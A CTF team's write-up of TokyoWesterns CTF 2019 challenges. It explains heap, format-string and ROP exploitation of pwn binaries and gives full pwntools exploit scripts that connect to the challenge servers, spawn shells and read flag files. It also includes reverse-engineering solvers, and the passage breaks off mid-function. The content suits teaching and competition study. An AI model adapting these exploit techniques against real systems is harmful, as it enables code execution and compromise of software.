# TokyoWesterns CTF 5th 2019 Writeup (A\*0\*E)

## Pwn

### Asterisk-Alloc

Full protection enabled.

Allow alloc & calloc for only once, realloc & free arbitrary times (free will not clear the pointer).

Notice that calloc will not use tcache. The same to realloc when increase size.
However, `realloc(NULL, size)` will malloc with tcache. `realloc(ptr, 0)` will free & return NULL (so will clear the pointer).

It's not hard to get arbitrary write.
With arbitrary write, we can partial overwrite some pointer on stdout for leakage.
However, if we use `realloc` to get fake bin before stdout, it's impossible to realloc or free again, which means, after leakage, we can do nothing.
If we try to use misalign to get a valid size in tcache range, the only one is 0x210 at more than 0x300 before stdout. So important pointer would be overwrite and cause crash in scanf.
Notice that free size 0x7f will cause crash because `mmap` bit is set.

So, now, we need to find a way to `malloc` before stdout instead of `realloc`.
First, put a bin in both tcache bins & small bins. So a libc pointer is on the next field of tcache link.
Then, use `realloc` to get the small bin & partial overwrite the libc pointer.
If we `realloc` to a smaller bin & `realloc` to 0 to free it, the overwritten libc pointer will be erased. In order to bypass it, we need to prepare a freed small bin before current bin. So it will merge with previous bin when free, the overwritten libc pointer remains unchanged.
Now, we can use `realloc` tcache bin to overwrite stdout for leakage.

After leakage, we have a freed smallbin overlapped with freed tcache bin. So `realloc` the smallbin to overwrite next field of tcache link. Then it's easy to overwrite `__free_hook` to `system`.

```python
#!/usr/bin/env python
# coding:utf-8
# Usage: ./exploit.py MODE=remote LOG_LEVEL=warn NOPTRACE NOASLR

from ctf import *

binary = './asterisk_alloc-8f5838ad20b965740e53a3ac7c60b9c61b124f9053ff8fd608d9d064ee0ffb7c'
context.terminal = ['tmux', 'splitw', '-h']
mode = args['MODE'].lower()

if args['LIBC']:
    os.environ['LD_PRELOAD'] = os.path.abspath(args['LIBC'])
code = context.binary = ELF(binary)
if args['LIBDEBUG']:
    os.environ['LD_LIBRARY_PATH'] = '/dbg{}/lib'.format(code.bits)
libc = code.libc


def exploit():
    if mode == 'remote':
        io = remote('ast-alloc.chal.ctf.westerns.tokyo', 10001)
        context.noptrace = True
    elif mode == 'debug':
        io = gdb.debug(binary, gdbscript='''
            c
        ''')
    else:
        io = process(binary)

    c = io

    def dom(sz,dat):
        c.sendlineafter('choice: ','1')
        c.sendlineafter('Size: ',str(sz))
        c.sendafter('Data: ',dat)

    def doc(sz,dat):
        c.sendlineafter('choice: ','2')
        c.sendlineafter('Size: ',str(sz))
        c.sendafter('Data: ',dat)

    def dor(sz,dat):
        c.sendlineafter('choice: ','3')
        c.sendlineafter('Size: ',str(sz))
        if sz > 0:
            c.sendafter('Data: ',dat)

    def dofree(ch):
        c.sendlineafter('choice: ','4')
        c.sendlineafter('Which: ',ch)

    doc(0x80, 'AAAA')
    dor(0x1f0, 'AAAA')
    dor(0xf0, 'AAAA')
    for i in range(6):
        dofree('r')
    dor(0, '')
    dor(0x80, p16(0x1760))
    for i in range(8):
        dofree('c')
    dor(0x400, 'AA')
    dor(0x30, 'AA')
    dor(0, '')
    dor(0xf0, 'AA')
    dom(0xf0,p64(0xfbad3c80)+p64(0)*3+p8(0))#leak

    io.recvn(8)
    leak = u64(io.recvn(8))
    info('leak: %#x', leak)
    libc.address = leak - 0x3ed8b0
    info('libc address: %#x', libc.address)

    dor(0x40, 'AAA')

    dor(0x180, cyclic(0xd8) + p64(0x41) + p64(libc.symbols['__free_hook']))
    dor(0, '')

    dor(0x30, 'AAAA')
    dor(0x10, 'AAAA')
    dor(0, '')

    dor(0x30, p64(libc.symbols['system']))
    dor(0, '')

    dor(0x800, '/bin/sh')
    dofree('r')


    io.gdb.attach(gdbscript='''
    ''')
    io.gdb.interrupt()
    io.gdb.execute('parseheap')
    io.gdb.execute('bins')

    io.interactive()


if __name__ == '__main__':
    exploit()
```

### nothing more to say

No protection, `gets` stack overflow. Use rop to call `gets` on data segment, write shellcode, then jump to the rwx buffer.

```python
from pwn import *
context(terminal='zsh', arch='amd64', log_level='info')

p = remote('nothing.chal.ctf.westerns.tokyo', 10001)
# p = process('./warmup', env={'LD_PRELOAD': './libc-local.so'})

payload = "A" * 0x100
payload += "B" * 8

pop_rdi = 0x400773
gets_plt = 0x400580
rop_chain = [
    pop_rdi,
    0x601830,
    gets_plt,
    0x601830,
]
payload += flat(rop_chain)
p.sendline(payload)
sleep(0.5)
p.sendline(asm(shellcraft.amd64.sh()))

p.interactive()
```

### printf

This challenge implements a customized `Printf` and we can control the parameter of the `Printf`, so we have infoleak by `%lx.%lx.%lx...`.

In customized `Printf`, there are three steps. It first calculates the buffer size and alloc on the stack, then puts the formatted string on the buffer, finally outputs the formatted string.

The bug is the mismatch between the first two steps. For `%100c`, it will reserve 100 bytes. However, in the second step it will ignore the width and only writes one byte on the buffer. Notice that the width is a `_int64` number and we have leaked everything, so we can lift the stack to anywhere by `"%{}c".format(stack_addr-ld_addr)` and write a string on it(difficult to write ptrs because it is difficult to insert "\x00" to a string).

Then we can overwrite the `_rtld_global+3848` to hijack `exit`. The exit hook is `(*(_rtld_global+3848))(_rtld_global+2312)`. Unluckily, it cannot meet the requirement of one_gadget, so we call `gets` instead. By `gets` function we can control the buffer after `_rtld_global+2312`. After the `_rtld_global+3848` called, it will call `_rtld_global+3856` with the same parameter. So we can write "/bin/sh\x00" to `_rtld_global+2312`, address of `system` to `_rtld_global+3856`, and remain the rest of pointers, it will getshell.

In addition, it is worthy to say that this challenge runs in Ubuntu 19.04, I changed the ld and libc for the binary, but the offset between ld and libc on my Ubuntu 18.04 is different from the server, so I have to leak ld address and calculate the offset based on it.

```python
from pwn import *
context(terminal='zsh', arch='amd64', log_level='info')

p = remote('printf.chal.ctf.westerns.tokyo', 10001)
# p = process('./printf')#, env={'LD_PRELOAD': './libc.so.6'})

payload = "%x"* 20
payload += ".%lx."
payload += "%x"* 18
payload += ".%lx." * 4
p.sendlineafter("What's your name?", payload)

p.recvuntil("Hi")
p.recvuntil('.')
ld_addr = int(p.recvuntil('.', True), 16)
log.info(hex(ld_addr))
p.recvuntil('.')
stack_addr = int(p.recvuntil('.', True), 16)
log.info(hex(stack_addr))
p.recvuntil('.')
canary = int(p.recvuntil('.', True), 16)
log.info(hex(canary))
p.recvuntil('.')
text_addr = int(p.recvuntil('.', True), 16)
log.info(hex(text_addr))
p.recvuntil('.')
libc_addr = int(p.recvuntil('.', True), 16) - 0x1b6b
log.info(hex(libc_addr))

one_gadget = libc_addr + 0xe1ef8
strlen_got = libc_addr + 0x1bf0a8
gets_addr = libc_addr + 0x5e2f0
exit_hook = ld_addr - 0x7c8
system_addr = libc_addr + 0x2dfd0
puts_addr = libc_addr + 0x5ecc0
p.recvuntil("Do you leave a comment?")
# log.info(hex(one_gadget))
log.info(hex(exit_hook))

pause()
cont = [0x0000000000000000, 0x0000000000000001, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000001, 0x0000000000000000, 0x0000000000000000, 0x0000000000000004, 0x0000000000000000, 0x0016516e1dc8250c, 0x0000000000000000, 0x0000000000000064, 0x0000000000000003, 0x00007f9879491cb0, 0x00007f9879465000, 0x000055f9f7ef42a8, 0x00007f987948fe70, 0x0000000000000000, 0x00007f9879455000, 0x00007f98794909f0, 0x0000000000000000, 0x00007f9879491050, 0x0000000000000000, 0x0000000000000000, 0x00007f987948fef0, 0x00007f987948fee0, 0x00007f987948fe80, 0x00007f987948fea0, 0x00007f987948feb0, 0x00007f987948ff20, 0x00007f987948ff30, 0x00007f987948ff40, 0x00007f987948fec0, 0x00007f987948fed0, 0x0000000000000000, 0x0000000000000000, 0x00007f987948fe70, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x00007f987948ff00, 0x0000000000000000, 0x0000000000000000, 0x00007f987948ff10, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x00007f987948ff60, 0x00007f987948ff50, 0x0000000000000000, 0x0000000000000000, 0x00007f987948ff80, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x00007f987948ff70, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x00007f987948fe90, 0x00007f9879465040, 0x0000000000000000, 0x0000000000000009, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x00007f9879455950, 0x0000001100000006, 0x0000000800000003, 0x00007f9879465348, 0x00007f9879465368, 0x00007f98794653a8, 0x0000001d00000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x00007f9879465984, 0x0000000000000000, 0x00007f9879465000, 0x00007f9879491190, 0x00007f9879486130, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000100000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x00007f98794654f0, 0x0000000000000001, 0x00007f9879455000, 0x00007f98792726d0, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x000000000002a5c0, 0x0000000000000840, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x00007f98792f84fd, 0x0000000000000000, 0x00007f987944f760, 0x0000000000000d68, 0x0000000000000001, 0x00007f987944f7e3, 0x00007f98792f9c31, 0x000000000000000e, 0x00007f987944f760, 0x0000000000000008, 0x000055f9f7ef9020, 0x00007f9879490f60, 0x00007f9879450560, 0x0000000000000000, 0x00007f98792fa0f3, 0x00007f987944f760, 0x000055f9f7ef9020, 0x000000000000000e, 0x00007f987944f760, 0x000055f9f7ef9020, 0x00007f98792ede4a, 0x0000000000000000]
stack_buf = stack_addr - 0x390
offset = stack_buf - exit_hook
# payload = "%9223372036854775807c.%9223372036854775807c.%d%d%d"
payload = "AAAAAAA%{}c".format(offset)
payload += p64(gets_addr)
# payload += p64(0)*10
p.sendline(payload)
sleep(1)
payload = "/bin/sh\x00"
for ptr in cont:
    if ptr >= 0x00007f987926a000 and ptr <= 0x00007f9879457000:
        ptr = ptr - 0x7f987928f000 + libc_addr
    elif ptr >= 0x00007f9879465000 and ptr <= 0x00007f9879492000:
        ptr = ptr - 0x7f9879491730 + ld_addr
    elif ptr >= 0x000055f9f7ef4000 and ptr <= 0x000055f9f7efa000:
        ptr = ptr - 0x55f9f7ef6a40 + text_addr
    payload += p64(ptr)
payload += p64(stack_addr-0x210)
payload += p64(text_addr-0x1970)
payload += p64(stack_addr)
payload += p64(0)
payload += p64(text_addr-0xfb)
payload += p64(0)
payload += p64(system_addr)
payload += p64(system_addr)
# payload += "\x00"*0x530
# payload += p64(0x081c00000001)
p.sendline(payload)
p.interactive()
```

### SecureKarte

This is a heap challenge without PIE or RELRO. You can `add`, `delete` and `modify`, but no `show`. There are two keys in data segment which are initialized with a random number. You can call `modify` only if the two keys are equal. However, after the `modify` operation, `key_1` will be 0xdeadc0bebeef while `key_2` is not changed. The bug is uaf in `modify`, you can modify the target even if it is already deleted. Besides, the challenge runs in Ubuntu 18.04 but the `add` operation use `calloc` for the allocation less than 0x800 bytes while `calloc` doesn't use tcache.

First we need to overwrite `key_2` to 0xdeadc0bebeef so that we can call `modify` many times. First I calloc and free 8 times, after that the tcache is full and following free will go to fastbin. Then I use uaf to control the FD of the fastbin and points to the front of `key_2`. Here I have to use the high byte of heap address to do the fastbin attack, so the heap address should be **0x7xxxxx**. Besides, calloc will destroy something so I have to set the `Mmap'd` flag of the size.

During the fastbin attack, I can also control the buffer pointer pointing to got table. So after I can modify more times, I overwrite the low 2 bytes of `atoi` which is close to `system` . The probability is 1/16 here.

```python
from pwn import *
context(terminal='zsh', arch='amd64', log_level='critical')

def sploit():
    global p
    def chose(n):
        p.sendlineafter("> ", str(n))

    def add(a0="96", a1="AAAAAAAA"):
        chose("1")
        p.sendafter("Input size > ", (str(a0)+"\n")[:])
        p.sendafter("Input description > ", (str(a1)+"\n")[:])
        p.recvuntil("Added id")
        return p.recvline().strip()

    def modify(a0, a1="BBBBBBBB"):
        chose("4")
        p.sendafter("Input id > ", (str(a0)+"\n")[:])
        p.sendafter("Input new description > ", (str(a1))[:])

    def delete(a0):
        chose("3")
        p.sendafter("Input id > ", (str(a0)+"\n")[:])

    def rename(name):
        chose("99")
        p.sendlineafter("Input patient name...", name)

    p.sendlineafter("Input patient name...", "AAA")
    for i in range(8):
        delete(add())
    id_1 = add()
    id_2 = add()
    delete(id_1)
    delete(id_2)
    modify(id_2, p32(0x602142)[:3])
    id_1 = add()
    payload = "\x00"*2+p32(0x1234)
    payload += p64(0x602078)
    payload += p32(1) + p32(0x1234)
    payload += p64(0x602078)
    payload += p64(0x0000deadc0bebeef)
    id_2 = add(a1=payload)
    modify(0x1234, '\x40\xf4')
    p.recvuntil("> ")
    print("1/16")
    p.sendline("/bin/sh;")
    print("Starting shell")
    sleep(1)
    p.sendline("echo -n 'fuckmelody'")
    print("Fuck melody")
    p.recvuntil("fuckmelody")
    print("Success!")
    p.sendline("cat flag")
    p.interactive()

while True:
    try:
        p = remote('karte.chal.ctf.westerns.tokyo', 10001)
        # p = remote('127.0.0.1', 8888)
        # p = process('./karte')
        sploit()
        # p.close()
    except:
        p.close()
```

### multi_heap

This is a C++ heap challenge. There are 3 classes: **char**, **long**, **float** and 5 options: **Alloc**, **Free**, **Write**, **Read**, **Copy**. **Write** operation use virtual function to print data of the object. The first bug is the uninitialize here, so we can leak heap and libc address.

The second bug is in **Copy**. It uses thread to do the copy operation.

```c++=
void __fastcall __noreturn thread_copy(thread_copy_struct *a1)
{
  unsigned __int64 i; // [rsp+18h] [rbp-28h]
  thread_copy_struct v2; // [rsp+28h] [rbp-18h]

  v2 = *a1;
  usleep(1u);
  for ( i = 0LL; i < v2.size; ++i )
    v2.dst[i] = v2.src[i];
  pthread_exit(0LL);
}
```

`v2.size` here can be very large if we pass a negative number and it will lead to heap overflow. However, it inevitably writes to the border of the page and raise SEGV. Notice that it runs in a thread, so we have chance to take advantage of the overflow and spawn a shell before it reaches the border. We use the overflow to control the vtable and call to one_gadget. In 18.04, the `RCX=NULL` gadget has a `movaps` instruction which requires the alignment of the stack. Unluckily neither one is useful. The best gadget is `setcontext`. Since `rdi` points to `this` which is fully controlled, I am able to control every register and call execve syscall.

In addition, for thread race challenge you must prepare a server with more than one cores. And you should send everything at once to race a very narrow window, because socket io is really time-consuming.

```python
from pwn import *
context(terminal='zsh', arch='amd64', log_level='info')

p = remote('multiheap.chal.ctf.westerns.tokyo', 10001)
# p = remote('0', 8888)
# p = process('./multi_heap')

def recvptr(self): return u64(self.recvline().rstrip().ljust(8, "\x00"))
pwnlib.tubes.remote.remote.recvptr = recvptr
pwnlib.tubes.process.process.recvptr = recvptr

def chose(n):
    p.sendlineafter("Your choice: ", str(n))

def alloc(a0="char", a1="48", a2="m"):
    chose("1")
    p.sendafter("Which: ", (str(a0)+"\n")[:])
    p.sendafter("Size: ", (str(a1)+"\n")[:])
    p.sendafter("Main or Thread? (m/t): ", (str(a2)+"\n")[:])

def free(a0="0"):
    chose("2")
    p.sendafter("Index: ", (str(a0)+"\n")[:])

def write(a0="0"):
    chose("3")
    p.sendafter("Index: ", (str(a0)+"\n")[:])

def read(a0="0", a1="8", a2="AAAA"):
    chose("4")
    a1 = int(a1)
    p.sendafter("Index: ", (str(a0)+"\n")[:])
    p.sendafter("Size: ", (str(a1)+"\n")[:])
    if a1 > 0:
        p.sendafter("Content: ", str(a2)[:a1].ljust(a1, "\x00"))
    else:
        p.sendafter("Content: ", str(a2))

def copy(src="0", dst="1", a2="16", a3="n"):
    chose("5")
    p.sendafter("Src index: ", (str(src)+"\n")[:])
    p.sendafter("Dst index: ", (str(dst)+"\n")[:])
    p.sendafter("Size: ", (str(a2)+"\n")[:])
    p.sendafter("Thread process? (y/n): ", (str(a3)+"\n")[:])

alloc()
alloc()
free(0)
free(0)
alloc()
write(0)
heap_addr = p.recvptr()
log.info(hex(heap_addr))
free(0)
alloc(a1=0x480)
alloc(a1=0x40)
free(0)
alloc(a1=0x480)
write(1)
libc_addr = p.recvptr() - 0x3ebca0
log.info(hex(libc_addr))
one_gadget = libc_addr + 0x4f2c5
system = libc_addr + 0x4f440
free(1)
# alloc(a1=0x20, a2="t") #1
alloc(a1=0x1000000) #1
print(hex(heap_addr+0x120))
alloc(a1=0x1000) #2
alloc(a1=0x1000) #3
alloc(a1=0x1000) #4
free(2)
free(2)
free(2)
alloc(a1=0x20) #2
alloc(a1=0x20) #3
alloc(a1=0x100) #4
alloc(a1=0x20) #5
# pause()
magic = libc_addr + 0x520A5  # setcontext
sh_str = libc_addr + 0x1b3e9a
pop_rax = libc_addr + 0x439c8
syscall = libc_addr + 0xd2975
payload = "\x00"
payload = payload.ljust(0xd0, "\x00")
payload += p64(magic) * 4
payload = payload.ljust(0x108, "\x00")
payload += p64(0x31)
payload += p64(heap_addr+0x230+0xd0)
payload += p64(59) * 2
payload += p64(syscall)
payload += "\x00" * 0x48
# 0x68 rdi
payload += p64(sh_str)
# 0x70 rsi
payload += p64(0)
payload += p64(0) * 2
# 0x88 rdx
payload += p64(0)
payload += p64(0) * 2
# 0xa0 rsp
payload += p64(heap_addr+0x350)
# 0xa0 rcx
payload += p64(pop_rax)

read(1, len(payload), payload)
# copy(1, 2, 0, a3="y")
chose("5")
p.sendlineafter("Src index: ", str(1))
p.sendlineafter("Dst index: ", str(4))
p.sendlineafter("Size: ", "0")
# pause()
p.sendline("y\n3\n5\n3\n5\n3\n5")#\n3\n3\n3\n3")
p.recvuntil("Index: ")
print("ok")

p.interactive()
```

### mi

It's a simply UAF heap challenge, but malloc  is implemented by libmimalloc.   

With a few trys, I find it uses a fastbin-like way to manage freed chunk, but only reuses the chunk in fastbin when I  malloc the same size chunk repeatedly some times, so it's easy to leak and modify the next pointer, and the libc and libmimalloc base can be guessed using this leakage (about 1/1024).  The most difficult thing is that  malloc will memset the chunk before return and the protection is strict so a legal next pointer must locate in the mmaped big chunk.   

It seems impossible to malloc arbitrary address because of full prorection, but it's available to malloc address in the mmapd big chunk by fake the next pointer. There are some key values  at the head of big chunk. Overwrite it and it crashed in `_mi_malloc_generic` when malloc again! Now v28 is an arbitrary value I can control, v13 is the head of mmaped chunk which I modified. It's clear that I can write a qword to an arbitrary address which stores 0 originally at Line 270.  

```C=250
  if ( v25 & 0xFFFFFFFFFFFFFFFCLL )
  {
    v28 = *v27;
    if ( *v27 )
    {
      LOWORD(v29) = 1;
      while ( 1 )
      {
        LOWORD(v29) = v29 + 1;
        if ( !*v28 )
          break;
        v28 = (_QWORD *)*v28;
      }
      v29 = (unsigned __int16)v29;
    }
    else
    {
      v28 = (_QWORD *)(v25 & 0xFFFFFFFFFFFFFFFCLL);
      v29 = 1LL;
    }
    *v28 = *(_QWORD *)(v13 + 8);
    *(_QWORD *)(v13 + 8) = v27;
    _InterlockedSub64((volatile signed __int64 *)(v13 + 40), v29);
    *(_QWORD *)(v13 + 24) -= v29;
```
Adjust my payload and make this function return peacefully, at the meantime overwrite `deferred_free` function pointer in `_mi_malloc_generic`  with one gadget, malloc again and get the shell.   
```C=
  ++**(_QWORD **)v3;
  if ( deferred_free )
    deferred_free(0LL);
  v4 = (volatile signed __int64 *)(v3 + 2632);
  while ( 1 )
  {
    v5 = (signed __int64 *)*((_QWORD *)v3 + 329);
```

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.log_level="error"
context.arch="amd64"
pwn_file="./mi"
#elf=ELF(pwn_file)
#heap_add=0
#stack_add=0
times=0
while True:
    if len(sys.argv)==1:
        r=process(pwn_file)
        pid=r.pid
    else:
        r=remote("mi.chal.ctf.westerns.tokyo",10001)
        pid=0

    def debug():
        log.debug("process pid:%d"%pid)
        pause()

    def add(idx,size):
        r.sendafter(">>","1".ljust(0x1f,"\x00")+str(idx).ljust(0x1f,"\x00")+str(size).ljust(0x1f,"\x00"))
    #    0x10390000r.sendlineafter("number",str(idx))
    #    r.sendlineafter("size",str(size))

    def edit(idx,content):
        r.sendafter(">>","2".ljust(0x1f,"\x00")+str(idx).ljust(0x1f,"\x00")+content)
    #    r.sendlineafter("number",str(idx))
    #    r.sendafter("value",content)

    def show(idx):
        r.sendlineafter(">>","3")
        r.sendlineafter("number\n",str(idx))
        return r.recvline()[:-1]

    def dele(idx):
        r.sendlineafter(">>","4")
        r.sendlineafter("number",str(idx))

    try:
        add(0,0x50)
        add(1,0x50)
        dele(0)
        dele(1)
        leak = u64(show(1)+"\x00\x00")
        heap_addr = leak-0xa0-0x30-0x15e0
        offset = (leak+0x100)&0xffffffffffff0000
        #print "offset: ",
        delta = 0x10390000
        #delta = int(raw_input(),16)
        elf_addr = offset + delta
        libc_addr = elf_addr + 0x22a000
        #pause()
        edit(1,p64(offset+0x70)*10)
        for i in range(0x30):
            add(2,0x50)
        add(3,0x50)
        edit(3,p64(heap_addr+0x2658)+p64(elf_addr+0x228970)*9)
        add(2,0x50)
        #print hex(heap_addr)
        #print hex(offset)
        #print hex(elf_addr)
        add(2,0x50)
        f = {
            0:0,
            0x18:p64(libc_addr+0x10a38c),# one gadget
            0x28:p64(heap_addr+0x2650),
            0x30:p64(0x50),
        }
        edit(2,fit(f,length=0x50))
        add(2,0x50)
        r.sendlineafter(">>","1")
        r.sendlineafter("number","1")
        r.sendlineafter("size","100")
        r.sendline("\n\n")
        r.sendline("echo 666;ls ; cat fl* ; cat F* ;cat /home/*/f*; cat /f*")
        r.recvuntil("666")
        r.interactive()
        break
    except Exception as e:
        print "fail",times
        times+=1
        r.close()

```


## Reverse

### M-Poly-Cipher

After reversing we can summarize 3 operations with below. Most variables are `8x8` matrix in `Zmod(0xfffffffb)`.

```
pub2 = (-pub0*priv^2)+-pub1*priv

ct0, ct1, ct2 = r*pub0, r*pub1, r*pub2+pt
# r is from urandom

pt = ct2+ct1*priv+ct0*priv^2
```

It looks like Ring-LWE and I think about it for a while. But suddenly realized it's possible to recover `r` directly and no need to catch `priv`.

```
from struct import unpack

f = open('flag.enc','rb')
ct0 = []
for i in range(64):
    ct0.append(unpack('I',f.read(4))[0])
ct1 = []
for i in range(64):
    ct1.append(unpack('I',f.read(4))[0])
ct2 = []
for i in range(64):
    ct2.append(unpack('I',f.read(4))[0])
f.close()

f = open('public.key','rb')
p0 = []
for i in range(64):
    p0.append(unpack('I',f.read(4))[0])
p1 = []
for i in range(64):
    p1.append(unpack('I',f.read(4))[0])
p2 = []
for i in range(64):
    p2.append(unpack('I',f.read(4))[0])
f.close()

n = 0xfffffffb

p0 = matrix(Zmod(n),8,8,p0)
ct0 = matrix(Zmod(n),8,8,ct0)


'''
r0 = p0.solve_left(ct0)
print r0
'''

p1 = matrix(Zmod(n),8,8,p1)
ct1 = matrix(Zmod(n),8,8,ct1)
'''
r1 = p1.solve_left(ct1)
print r1
'''

pp = p0.augment(p1)
ct = ct0.augment(ct1)
r = pp.solve_left(ct)

print r
assert r*p0 == ct0
assert r*p1 == ct1


p2 = matrix(Zmod(n),8,8,p2)
ct2 = matrix(Zmod(n),8,8,ct2)
ans = ct2-r*p2
print vector(ans)
```

### Easy Crack Me

The binary checks your input with several constraints. Cannot figure out any pattern but since the search space is not large, I just write C to bruteforce it.

```C
#include<iostream>
#include<stdlib.h>
#include<string.h>

using namespace std;

char s[40];

int cnt[] = {3,2,2,0,3,2,1,3,3,1,1,3,1,2,2,3};
int a[] = {0x80, 0x80, 0xff, 0x80, 0xff, 0xff, 0xff, 0xff, 0x80, 0xff, 0xff, 0x80, 0x80, 0xff, 0xff, 0x80, 0xff, 0xff, 0x80, 0xff, 0x80, 0x80, 0xff, 0xff, 0xff, 0xff, 0x80, 0xff, 0xff, 0xff, 0x80, 0xff};

int a0[]={0x15e, 0xda, 0x12f, 0x131, 0x100, 0x131, 0xfb, 0x102};
int a1[]={0x52, 0xc, 0x1, 0xf, 0x5c, 0x5, 0x53, 0x58};
int b0[]={0x129, 0x103, 0x12b, 0x131, 0x135, 0x10b, 0xff, 0xff};
int b1[]={0x1, 0x57, 0x7, 0xd, 0xd, 0x53, 0x51, 0x51};


int getidx(char ch) {
    if (ch>='0'&&ch<='9')
        return ch-'0';
    else if (ch>='a'&&ch<='f')
        return ch-'a'+10;
    return -1;
}

char getch(int idx) {
    if (idx<10)
        return '0'+idx;
    else
        return 'a'+idx-10;
}

int maxidx=0;

void search(int idx) {
    int i,l,r,tot;
    if (idx>maxidx)
        maxidx = idx;
    if (idx==38) {
        cout<<"found!"<<endl;
        cout<<s<<endl;
        return;
    }
    if (s[idx]!=0) {
        search(idx+1);
        return;
    }
    for (i=0;i<8;i++) 
        if (idx==4*i+9+1) {
            if ((s[4*i+6]+s[4*i+7]+s[4*i+8]+s[4*i+9])!=a0[i])
                return;
            if ((s[4*i+6]^s[4*i+7]^s[4*i+8]^s[4*i+9])!=a1[i])
                return;
        }
    for (i=0;i<8;i++) 
        if (idx==i+30+1) {
            if ((s[i+6]+s[i+14]+s[i+22]+s[i+30])!=b0[i])
                return;
            if ((s[i+6]^s[i+14]^s[i+22]^s[i+30])!=b1[i])
                return;
        }
    if (idx==37) {
        tot = 0;
        for (i=0; i<16; i++)
            tot += s[2*i+6];
        if (tot!=1160)
            return;
    }
    
    if (a[idx-6]==0x80) {
        l=10;
        r=16;
    } else {
        l=0;
        r=10;
    }
    for (i=l;i<r;i++) {
        if (cnt[i]==0)
            continue;
        cnt[i]--;
        s[idx]=getch(i);
        search(idx+1);
        s[idx]=0;
        cnt[i]++;
    }
}

int main() {
    memset(s, 0, 39);
    memcpy(s,"TWCTF{",6);
    s[38] = '}';
    s[7]=102;
    s[11]=56;
    s[12]=55;
    s[23]=50;
    s[31]=52;
    s[37]=53;
    s[15]=55;
    cnt[getidx(102)]--;
    cnt[getidx(56)]--;
    cnt[getidx(55)]--;
    cnt[getidx(50)]--;
    cnt[getidx(52)]--;
    cnt[getidx(53)]--;
    cnt[getidx(55)]--;
    search(6);
    cout<<maxidx<<endl;
    return 0;
    
}
```

### meow

we are given a neko bytecode file, by using nekoc we can dump the bytecode representations. by searching the reference to string "Usage: meow INPUT OUTPUT", we can find the main function responsible for encryption at 0xc7b.

the main log can be simplified as following, 

+ read pixels from a image, check if the size is (768, 768)
+ generate a column swap table using some fixed seed to Random
+ swap each pixel in target columns by get/get/set/set
+ generate a xor table for the whole image
+ xor the target image and save the result

since the xor table and swap table are fixed, we can just dump them rather than reversing the random generator,

+ for xor table:
    * generate an all black image and do encryption
    * the swap wont change the image
    * xor against 0 will reveal the key, we can get a xor_key.png
+ for swap table:
    * generate an all white image and do encryption, get white_enc.png
    * set the diagonal of the image to black and do encryption, get diagonal_enc.png
    * diff between white_enc.png and diagonal_enc.png, for each row, the different coordiante shall be the target swap column number

have retrieved the xor table and swap table, we then reverse the swap table to get re-swap table, finally xor the encrypted_flag and swap back to get original image.

```python
from PIL import Image
import os

colswap_enc = [
    0x005, 0x03a, 0x038, 0x295, 0x0ea, 0x020, 0x0be, 0x0ed, 0x075, 0x240,
    # ...
    0x1f2, 0x2e4, 0x2cd, 0x2bf, 0x2f6, 0x171, 0x06e, 0x185
]

colswap_dec = [0] * 768
for i in range(0, 768):
    colswap_dec[colswap_enc[i]] = i

flag_img = Image.open("flag_enc.png")
output_img = Image.open("flag_enc.png")     # dummy
xorkey_img = Image.open("xor_key.png")

flagenc = flag_img.load()
xorkey = xorkey_img.load()
output = output_img.load()

for i in range(0, 768):
    for j in range(0, 768):
        t = list(flagenc[i ,j])
        t[0] ^= xorkey[i, j][0]
        t[1] ^= xorkey[i, j][1]
        t[2] ^= xorkey[i, j][2]
        flagenc[i, j] = tuple(t)

for i in range(0, 768) :
    for j in range(0, 768) :
        output[colswap_dec[i], j] = flagenc[i, j]

output_img.save("flag_dec.png")
```

### holygrailwar

we are given a grail native-image with java code compiled to assembly, the binary takes in a string and output an encrypted cipher. strace the binary shows it only called sys_write after initialiation. so we break on sys_write and dump the call stack.

following the call stack, we find the function 0x4023C0 is the main logic compile from the java code. after some debugging and reversing, we find that the main logics are:

+ 1: input is padded with NULL byte, aligned to 8 bytes boundary
+ 2: input then split into array of dword
+ 3: initialize a index_table accroding to the *index* of the current input
+ 4: call sub_402000 to initialize a global_array accroding to index_table
+ 5: encrypt 2 dword from input with global_array, the result is 2 encrypted dword
+ 6: going back to step 3, until input are consumed

so basically the global_array for encryption is derived from the index of current input, it remains the same for different input, as long as the index is the same. so we can break after the callsite to sub_402000, and dump global_array for each round. this will be the same as the global_array used in every encryption for each round.

and the encryption is pretty straightforward, we have the python code for each round:

```python
def encrypt(table, plain):
    rol = lambda x, y: ((x << y) | ((x >> (32 - y)) & (2 ** y - 1))) & (2 ** 32 - 1)
    svm_heap = [x for x in table]
    input0 = plain[0]
    input1 = plain[1]
    v58 = (svm_heap[0] + input0) & (2 ** 32 - 1)
